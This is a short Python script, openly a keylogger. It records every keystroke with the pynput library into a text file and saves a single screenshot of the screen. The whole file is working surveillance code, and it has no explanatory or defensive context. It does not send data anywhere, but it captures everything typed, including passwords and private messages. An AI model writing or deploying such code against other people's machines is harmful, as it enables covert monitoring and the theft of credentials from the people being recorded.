from pynput.keyboard import Key, Listener
from PIL import ImageGrab

filepath = 'choose/path/to/your/file'
keylog = 'keylogger.txt'
scrshot = 'screenshot.png'
count = 0
keys = []
def on_press(key) :
    global keys, count
    print(key)
    count = count + 1
    keys.append(key)
    if count >= 1 :
        count = 0
        writefile(keys)
        keys = []

def on_release(key) :
    if key == Key.esc :
        return False

def writefile(keys):
    with open(filepath + keylog, "a") as f:
        for key in keys:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.backspace:
                f.write('[BACKSPACE]')
            elif key == Key.shift:
                f.write('[SHIFT]')
            elif key == Key.ctrl:
                f.write('[CTRL]')
            elif key == Key.alt:
                f.write('[OPTION]')
            elif key == Key.cmd:
                f.write('[COMMAND]')
            elif key == Key.tab:
                f.write('[TAB]')
            elif key == Key.esc:
                f.write('[ESC]')
            else:
                f.write(str(key).replace("'", ""))

def screenshot() :
    image = ImageGrab.grab()
    image.save(filepath + scrshot)
screenshot()

with Listener(on_press = on_press, on_release = on_release) as listener :
    listener.join()
